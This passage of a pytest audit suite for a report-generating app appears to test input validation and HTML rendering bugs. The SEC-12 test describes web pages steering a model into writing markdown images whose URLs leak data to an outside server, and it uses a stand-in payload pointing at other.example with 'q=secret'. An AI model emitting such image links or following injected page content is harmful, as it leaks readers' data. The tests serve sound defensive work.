        if error or (status is not None and status >= 500):
            broke[name] = error or status
    assert not broke, f"answered with a 500 instead of 422: {broke}"


@finding("BUG-55")
@pytest.mark.db
def test_bug55_a_topic_of_only_spaces_is_refused(admin, browser, configured, db):
    """min_length=3 counts the spaces; the topic is stripped afterwards. "     " is accepted, stored as
    "", takes a quota unit and a Worker slot, and the Run is started with no topic (live on the audit stack:
    queued, running ~10 s, failed empty_report, the Session titled ""). The page's own check is
    topic.strip().length >= 3, so only the API, MCP and integration tokens get through."""
    user = make_user(admin, browser, "audit-odd@example.org")
    for blank in ("     ", "\n\n\n", "\t\t\t"):
        r = user.post("/api/sessions", json={"language": "th", "topic": blank})
        assert r.status_code == 422, f"{blank!r}: {r.status_code}"


@finding("BUG-56")
@pytest.mark.db
def test_bug56_a_project_named_with_only_spaces_is_refused(admin, browser):
    """Same gap on ProjectIn.name / ProjectPatch.name (min_length=1 before strip()): a Project with
    an empty name, shown as a card with no title; renaming one to "   " also works."""
    user = make_user(admin, browser, "audit-odd@example.org")
    assert user.post("/api/projects", json={"name": "   "}).status_code == 422
    project = user.post("/api/projects", json={"name": "P"}).json()
    assert user.patch(f"/api/projects/{project['id']}", json={"name": "   "}).status_code == 422


@finding("BUG-57")
def test_bug57_a_citation_in_an_images_alt_text_does_not_break_the_tag():
    """CITATION.sub runs over the rendered HTML, so [1] inside ![alt [1]](url) is replaced by an <a> with
    double quotes in the middle of alt="...": the img tag ends early (live: the interactive export has
    <img src="https://example.org/a.png" alt="t <a class="cite" href="#src-1">...)."""
    from litstorm.render import html

    report = {"schema": 1, "engine": "storm", "title": "T", "language": "en", "lead": "![t [1] x](https://example.org/a.png)",
              "sections": [], "sources": [{"id": 1, "url": "https://a.example/x", "title": "A", "description": "", "evidence": []}]}
    page = html.render(report)
    assert not re.search(r'alt="[^"]*<a class=', page), "the citation's markup landed inside the alt attribute"


@finding("SEC-12")
def test_sec12_a_report_cannot_make_the_readers_browser_fetch_an_outside_image():
    """The report body is markdown from a model that has read web pages: ![](https://other.example/?q=...) becomes
    <img src="https://other.example/..."> in the HTML export (no CSP in that file) and on the web report page (no
    CSP either, SEC-09), so opening a report sends a request, with whatever the page made the model put in
    the URL, to a server the reader never chose. Live: Edge on the audit stack requested https://example.org/a.png
    when the report page and the saved HTML export were opened. (The interactive and brief pages are safe: img-src data:.)"""
    from litstorm.render import html

    report = {"schema": 1, "engine": "storm", "title": "T", "language": "en", "lead": "![x](https://other.example/a.png?q=secret)",
              "sections": [], "sources": []}
    page = html.render(report)
    assert "https://other.example/a.png" not in page or "<img" not in page
